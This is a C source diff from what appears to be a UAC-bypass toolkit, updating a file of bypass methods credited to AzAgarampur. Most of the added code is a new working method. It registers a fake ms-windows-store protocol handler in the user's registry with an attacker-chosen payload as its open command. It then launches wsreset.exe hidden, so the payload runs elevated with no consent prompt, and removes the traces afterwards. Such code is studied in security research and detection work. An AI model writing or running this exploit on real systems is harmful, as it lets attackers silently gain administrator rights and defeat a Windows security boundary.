@@ -1,22 +1,23 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020
+*  (C) COPYRIGHT AUTHORS, 2020 - 2021
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.54
+*  VERSION:     3.55
 *
-*  DATE:        26 Dec 2020
+*  DATE:        12 Mar 2021
 *
 *  UAC bypass methods from AzAgarampur.
-* 
+*
 *  For description please visit original URL
-* 
+*
 *  https://github.com/AzAgarampur/byeintegrity-uac
 *  https://github.com/AzAgarampur/byeintegrity2-uac
 *  https://github.com/AzAgarampur/byeintegrity3-uac
 *  https://github.com/AzAgarampur/byeintegrity4-uac
 *  https://github.com/AzAgarampur/byeintegrity-lite
+*  https://github.com/AzAgarampur/byeintegrity7-uac
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -112,7 +113,7 @@ NTSTATUS ucmNICPoisonMethod(
 
     do {
 
-        IsWin7 = (g_ctx->dwBuildNumber < 9200);
+        IsWin7 = (g_ctx->dwBuildNumber < NT_WIN8_RTM);
 
         if (!supInitFusion(IsWin7 ? 2 : 4))
             break;
@@ -589,7 +590,8 @@ NTSTATUS ucmWscActionProtocolMethod(
             protoGuidString,
             &SetUserAssoc,
             lpszPayload,
-            FALSE);
+            FALSE,
+            NULL);
 
         if (!NT_SUCCESS(MethodResult))
             break;
@@ -761,7 +763,8 @@ NTSTATUS ucmFwCplLuaMethod2(
             protoGuidString,
             &SetUserAssoc,
             lpszPayload,
-            TRUE);
+            TRUE,
+            NULL);
 
         if (!NT_SUCCESS(MethodResult))
             break;
@@ -891,14 +894,14 @@ NTSTATUS ucmFwCplLuaMethod2(
 }
 
 /*
-* ucmMsSettignsProtocolMethod
+* ucmMsSettingsProtocolMethod
 *
 * Purpose:
 *
 * Bypass UAC by registering own ms-settings protocol.
 *
 */
-NTSTATUS ucmMsSettignsProtocolMethod(
+NTSTATUS ucmMsSettingsProtocolMethod(
     _In_ LPWSTR lpszPayload
 )
 {
@@ -937,7 +940,8 @@ NTSTATUS ucmMsSettignsProtocolMethod(
             protoGuidString,
             &SetUserAssoc,
             lpszPayload,
-            TRUE);
+            TRUE,
+            NULL);
 
         if (NT_SUCCESS(MethodResult)) {
 
@@ -961,6 +965,381 @@ NTSTATUS ucmMsSettignsProtocolMethod(
             &SetUserAssoc);
 
         CoTaskMemFree(protoGuidString);
+    }
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
+
+    return MethodResult;
+}
+
+/*
+* ucmxGetAppXSvcState
+*
+* Purpose:
+*
+* Return AppXSvc service state.
+*
+*/
+DWORD ucmxGetAppXSvcState(
+    _In_ SC_HANDLE ServiceHandle
+)
+{
+    SERVICE_STATUS_PROCESS svcStatus;
+
+    ULONG dummy;
+
+    if (QueryServiceStatusEx(
+        ServiceHandle,
+        SC_STATUS_PROCESS_INFO,
+        (LPBYTE)&svcStatus,
+        sizeof(svcStatus),
+        &dummy))
+    {
+        return svcStatus.dwCurrentState;
+    }
+
+    return SERVICE_STOPPED;
+}
+
+/*
+* ucmxIsAppXSvcRunning
+*
+* Purpose:
+*
+* Return running state of AppXSvc (restart it if stopped).
+*
+*/
+BOOLEAN ucmxIsAppXSvcRunning(
+    VOID
+)
+{
+    BOOLEAN bRunning = FALSE;
+    SC_HANDLE schManager = NULL, schService = NULL;
+    ULONG dwState, uRetryCount;
+
+    do {
+
+        schManager = OpenSCManager(
+            NULL,
+            NULL,
+            SC_MANAGER_CONNECT);
+
+        if (schManager == NULL)
+            break;
+
+        schService = OpenService(
+            schManager,
+            T_APPXSVC,
+            SERVICE_QUERY_STATUS | SERVICE_START);
+
+        if (schService == NULL)
+            break;
+
+        dwState = ucmxGetAppXSvcState(schService);
+
+        if (dwState == SERVICE_RUNNING) {
+            bRunning = TRUE;
+            break;
+        }
+
+        if (dwState == SERVICE_PAUSE_PENDING ||
+            dwState == SERVICE_STOP_PENDING)
+        {
+
+            uRetryCount = 5;
+
+            do {
+
+                dwState = ucmxGetAppXSvcState(schService);
+                if (dwState == SERVICE_RUNNING) {
+                    bRunning = TRUE;
+                    break;
+                }
+
+                Sleep(1000);
+
+            } while (--uRetryCount);
+
+        }
+
+        if (dwState == SERVICE_STOPPED) {
+
+            if (StartService(schService, 0, NULL)) {
+
+                Sleep(1000);
+
+                dwState = ucmxGetAppXSvcState(schService);
+                if (dwState == SERVICE_RUNNING) {
+                    bRunning = TRUE;
+                    break;
+                }
+
+            }
+
+        }
+
+    } while (FALSE);
+
+    if (schService)
+        CloseServiceHandle(schService);
+
+    if (schManager)
+        CloseServiceHandle(schManager);
+
+    return bRunning;
+}
+
+/*
+* ucmxCleanupNoStore
+*
+* Purpose:
+*
+* Remove store association key.
+*
+*/
+VOID ucmxCleanupNoStore(
+    VOID
+)
+{
+    NTSTATUS ntStatus;
+    HANDLE classesKey = NULL;
+    WCHAR szBuffer[MAX_PATH + 1];
+
+    ntStatus = supOpenClassesKey(NULL, &classesKey);
+    if (!NT_SUCCESS(ntStatus))
+        return;
+
+    _strcpy(szBuffer, T_MSWINDOWSSTORE);
+    _strcat(szBuffer, TEXT("\\shell"));
+    supRegDeleteKeyRecursive(classesKey, szBuffer);
+
+    NtClose(classesKey);
+}
+
+/*
+* ucmxMsStoreProtocolNoStore
+*
+* Purpose:
+*
+* Bypass UAC by registering own ms-windows-store protocol.
+*
+*/
+NTSTATUS ucmxMsStoreProtocolNoStore(
+    _In_ LPWSTR lpszPayload
+)
+{
+    HANDLE classesKey = NULL, protoKey = NULL;
+    NTSTATUS ntStatus;
+    SIZE_T sz;
+    WCHAR szBuffer[MAX_PATH + 1];
+
+    ntStatus = supOpenClassesKey(NULL, &classesKey);
+    if (!NT_SUCCESS(ntStatus))
+        return ntStatus;
+
+    if (ERROR_SUCCESS == RegCreateKeyEx(classesKey,
+        T_MSWINDOWSSTORE,
+        0,
+        NULL,
+        REG_OPTION_NON_VOLATILE,
+        MAXIMUM_ALLOWED,
+        NULL,
+        (HKEY*)&protoKey,
+        NULL))
+    {
+        RegSetValueEx(protoKey, T_URL_PROTOCOL, 0, REG_SZ, NULL, 0);
+        RegCloseKey(protoKey);
+    }
+
+    _strcpy(szBuffer, T_MSWINDOWSSTORE);
+    _strcat(szBuffer, T_SHELL_OPEN);
+    _strcat(szBuffer, TEXT("\\"));
+    _strcat(szBuffer, T_SHELL_COMMAND);
+
+    if (ERROR_SUCCESS == RegCreateKeyEx(classesKey,
+        szBuffer,
+        0,
+        NULL,
+        REG_OPTION_NON_VOLATILE,
+        MAXIMUM_ALLOWED,
+        NULL,
+        (HKEY*)&protoKey,
+        NULL))
+    {
+
+        sz = (_strlen(lpszPayload) + 1) * sizeof(WCHAR);
+
+        if (ERROR_SUCCESS == RegSetValueEx(protoKey,
+            TEXT(""),
+            0,
+            REG_SZ,
+            (BYTE*)lpszPayload,
+            (DWORD)sz))
+        {
+            ntStatus = STATUS_SUCCESS;
+        }
+        else {
+            ntStatus = STATUS_REGISTRY_IO_FAILED;
+        }
+
+        RegCloseKey(protoKey);
+    }
+    else {
+        ntStatus = STATUS_REGISTRY_IO_FAILED;
+    }
+
+    NtClose(classesKey);
+
+    return ntStatus;
+}
+
+/*
+* ucmxMsStoreSetNoOpenWith
+*
+* Purpose:
+*
+* Place NoOpenWith parameter for application key.
+*
+*/
+VOID ucmxMsStoreSetNoOpenWith(
+    VOID
+)
+{
+    LPWSTR lpAppxId = NULL;
+    DWORD cbAppxId = 0;
+    HANDLE classesKey = NULL, appKey = NULL;
+    NTSTATUS ntStatus;
+
+    if (supGetAppxId(TEXT("WindowsStore"),
+        T_MSWINDOWSSTORE,
+        &lpAppxId,
+        &cbAppxId))
+    {
+        ntStatus = supOpenClassesKey(NULL, &classesKey);
+        if (NT_SUCCESS(ntStatus)) {
+
+            if (ERROR_SUCCESS == RegOpenKeyEx(classesKey,
+                lpAppxId,
+                0,
+                KEY_WRITE,
+                (HKEY*)&appKey))
+            {
+                RegSetValueEx(appKey, TEXT("NoOpenWith"), 0, REG_SZ, NULL, 0);
+                RegCloseKey(appKey);
+            }
+
+            NtClose(classesKey);
+        }
+        supHeapFree(lpAppxId);
+    }
+
+}
+
+/*
+* ucmMsStoreProtocolMethod
+*
+* Purpose:
+*
+* Bypass UAC by registering own ms-windows-store protocol.
+*
+*/
+NTSTATUS ucmMsStoreProtocolMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT hr_init;
+
+    LPOLESTR protoGuidString = NULL;
+    USER_ASSOC_PTR SetUserAssoc;
+    GUID guid;
+
+    BOOLEAN bAppXRunning = FALSE;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+
+    do {
+
+        bAppXRunning = ucmxIsAppXSvcRunning();
+        if (bAppXRunning) {
+
+            if (CoCreateGuid(&guid) != S_OK)
+                break;
+
+            if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
+                break;
+
+            //
+            // Find UserAssocSet
+            //
+            MethodResult = supFindUserAssocSet(&SetUserAssoc);
+            if (!NT_SUCCESS(MethodResult)) {
+                break;
+            }
+
+            //
+            // Set NoOpenWith
+            //
+            ucmxMsStoreSetNoOpenWith();
+
+            //
+            // Register shell protocol.
+            //
+            MethodResult = supRegisterShellAssoc(T_MSWINDOWSSTORE,
+                protoGuidString,
+                &SetUserAssoc,
+                lpszPayload,
+                TRUE,
+                T_URL_MS_WIN_STORE);
+
+
+        }
+        else {
+            //
+            // AppXSvc not running or in inconsistent state, try other method.
+            //
+            MethodResult = ucmxMsStoreProtocolNoStore(lpszPayload);
+        }
+
+        if (NT_SUCCESS(MethodResult)) {
+
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+            _strcat(szBuffer, WSRESET_EXE);
+
+            MethodResult = supRunProcess2(
+                szBuffer,
+                NULL,
+                TEXT("open"),
+                SW_HIDE,
+                INFINITE) ?
+                STATUS_SUCCESS : STATUS_ACCESS_DENIED;
+
+        }
+
+    } while (FALSE);
+
+    //
+    // Cleanup.
+    //
+    if (bAppXRunning) {
+
+        if (protoGuidString) {
+
+            supUnregisterShellAssoc(T_MSWINDOWSSTORE,
+                protoGuidString,
+                &SetUserAssoc);
+
+            CoTaskMemFree(protoGuidString);
+        }
+    }
+    else {
+        ucmxCleanupNoStore();
     }
 
     if (SUCCEEDED(hr_init))
